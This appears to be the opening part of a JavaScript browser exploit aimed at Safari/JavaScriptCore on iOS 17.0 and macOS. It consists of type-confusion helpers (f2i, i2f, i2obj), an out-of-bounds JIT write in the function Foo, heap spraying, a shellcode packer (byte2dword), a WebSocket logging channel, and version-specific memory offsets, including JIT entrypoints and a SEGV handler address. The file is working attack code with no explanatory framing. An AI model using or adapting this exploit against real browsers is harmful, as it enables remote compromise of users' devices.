const ITERATIONS = 100000;
const NUM_REGS = 32;
const OVERLAP_OFFSET = 8;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
const MAX_ITERATIONS = 0xc0000;
var BASE = 0x100000000;
var offsets = {};
var isMac = false;
var isIphone = false;
var buildNum = '';
var version = '';

var boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};
var getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;
var shape = {};
for (let i = 0; i < 14; ++i) {
	shape['p'+i] = i;
}
var shapes = [];
for (let i = 0; i < 0x1000; ++i) {
	shapes.push({
		...shape,
		['z'+i]: 0x1337
	});
}

let noCoW = 13.37;
let arr = [noCoW, 2.2, 3.3];
let oobArr = [noCoW, 2.2, 3.3];
let objArr = [{}, {}, {}];

function lower(x) {
    return x & 0xffffffff;
}
let lo = lower;

function higher(x) {
    return (x - (x % BASE)) / BASE;
}
let hi = higher;

function Foo(arr, n) {
    n = n | 0;
    if(n<0) {
        let v = (-n) | 0;
        let idx = Math.abs(n);
        if(idx < arr.length) {
            if(idx & 0x80000000) {
                idx += -0x7ffffffd;  // idx = 3;
            }
            if(idx>0) {
                return arr[idx] = 1.04380972981885e-310;  // i2f(0x133700001337);
            }
        }
    }
}

function f2i(val) { 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function byte2dword(payload) {
    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length / 6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for (let j = 0; j < 6; j++) {
            let c = payload[i * 6 + j]
            if (c === undefined) {
                c = 0;
            }
            pow = j == 0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function send(data) {
	try {
		ws.send(data);
	} catch (e) {
        void(0);
	}
}

function log(msg) {
	send(msg === undefined ? 'undefined' : msg.toString());
    document.getElementById("log").innerHTML += "<h1>"+msg+"</h1>";
}

function SetupOffsets() {
    isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    buildNum = navigator.userAgent.split('Mobile/')[1].split(' ')[0];
    if (isIphone)
        version = navigator.userAgent.split('iPhone OS ')[1].split(' ')[0];
    else if (isMac)
        version = navigator.userAgent.split('Mac OS X ')[1].split(' ')[0];
    else
        version = 'unknown';
    version = version.replace(/_/g, '.');
    let unknown_device = false;
    if (isMac && buildNum == '15E148') {
        offsets.factor = 840;
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 24;
        offsets.GLOBAL_OBJ_TO_VM = 56;
        offsets.VM_TO_TOP_CALL_FRAME = 0x9ac0;
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
    } else if (isIphone && buildNum == '15E148' && version == '17.0') {
        offsets.factor = 87;
        offsets.JS_CELL_HEADER_SIZE = 0x18;
        offsets.XHR_SCRIPT_EXECUTION_CONTEXT_OFFSET = 0x60;
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 24; // 24
        offsets.GLOBAL_OBJ_TO_VM = 56;
        // Find this offset e.g. by looking at JSC::VM::throwException in the JSC binary
        offsets.VM_TO_TOP_CALL_FRAME = 0x99c0; // 0x99c0
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.EXECUTABLE_TO_NATIVE_FUNC = 40;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
        offsets.JSC_BASE_TO_SEGV_HANDLER = 0x3e8b00b0;
        offsets.JSC_BASE_TO_CATCH_EXCEPTION_RET_ADDR = 0x279f8;
        offsets.JSC_BASE_TO_MATH_EXP = 0xbb877c;
    } else {
        offsets.factor = 87 + Math.floor(Math.random() * 1000);
        offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ = 16;
        offsets.GLOBAL_OBJ_TO_VM = 56;
        offsets.VM_TO_TOP_CALL_FRAME = 0x9c00;
        offsets.JS_FUNCTION_TO_EXECUTABLE = 24;
        offsets.EXECUTABLE_TO_JITCODE = 8;
        offsets.JIT_CODE_TO_ENTRYPOINT = 0x148;
        unknown_device = true;
    }
}